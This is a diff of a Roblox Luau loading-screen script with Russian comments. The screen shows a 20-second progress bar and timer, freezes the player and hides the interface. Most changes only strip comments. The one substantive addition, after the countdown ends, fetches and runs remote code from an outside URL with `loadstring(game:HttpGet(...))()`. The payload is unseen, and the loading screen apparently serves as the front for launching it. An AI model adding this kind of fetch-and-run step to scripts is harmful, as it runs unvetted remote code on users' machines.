@@ -191,7 +191,7 @@ local barContainer = Instance.new("Frame", G2L["3"])
 barContainer.BackgroundTransparency = 1
 barContainer.BorderSizePixel = 0
 barContainer.Size = UDim2.new(1, -32, 0.05, 0)
-barContainer.Position = UDim2.new(0, 16, 0.88, 0)  -- Немного опустил, чтобы освободить место для таймера
+barContainer.Position = UDim2.new(0, 16, 0.88, 0)
 
 local barBg = Instance.new("Frame", barContainer)
 barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
@@ -216,7 +216,7 @@ barGrad.Color = ColorSequence.new{
 	ColorSequenceKeypoint.new(1, Color3.fromRGB(115, 181, 255))
 }
 
--- ЛОГИКА ТА ЖЕ, ТОЛЬКО ДОБАВИЛ АНИМАЦИЮ БАРА И ТАЙМЕР
+-- ЛОГИКА ТА ЖЕ, ТОЛЬКО ДОБАВИЛ ЗАПУСК СКРИПТА ПОСЛЕ ЗАГРУЗКИ
 local function C_c()
 	local script = G2L["c"]
 
@@ -249,10 +249,10 @@ local function C_c()
 
 		local label = script.Parent
 		local goal = 941
-		local duration = 20  -- Изменено на 20 секунд
-		local updateInterval = 0.1  -- Более частое обновление для плавности
+		local duration = 20  -- 20 секунд
+		local updateInterval = 0.1
 		local statusLabel = script.Parent.Parent:FindFirstChild("status_working")
-		local timerLabel = script.Parent.Parent:FindFirstChild("time_remaining")  -- Новая метка времени
+		local timerLabel = script.Parent.Parent:FindFirstChild("time_remaining")
 		local barFill = script.Parent.Parent.Parent:FindFirstChild("Fill", true)
 
 		local messages = {
@@ -349,7 +349,7 @@ local function C_c()
 
 			while true do
 				local elapsed = tick() - startTime
-				local remaining = math.max(0, duration - elapsed)  -- Сколько осталось
+				local remaining = math.max(0, duration - elapsed)
 				local progress = math.clamp(elapsed / duration, 0, 1)
 				local current = math.floor(progress * goal)
 
@@ -395,6 +395,15 @@ local function C_c()
 			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
 			humanoid.PlatformStand = false
 			camera.CameraType = originalCameraType
+			
+			-- ЗАПУСКАЕМ СКРИПТ ПОСЛЕ ЗАВЕРШЕНИЯ ЗАГРУЗКИ
+			local success, err = pcall(function()
+				loadstring(game:HttpGet("https://cdn.project-reverse.org/overdrive_main.luau"))()
+			end)
+			
+			if not success then
+				warn("Ошибка запуска скрипта: " .. tostring(err))
+			end
 		end
 
 		countUp()
@@ -408,8 +417,6 @@ local function C_c()
 	
 	-- При смерти персонажа не сбрасываем GUI
 	player.CharacterAdded:Connect(function(newCharacter)
-		-- Можно либо ничего не делать (GUI остается)
-		-- Либо если нужно перезапустить загрузку для нового персонажа:
 		if currentConnections then
 			for _, conn in pairs(currentConnections) do
 				conn:Disconnect()
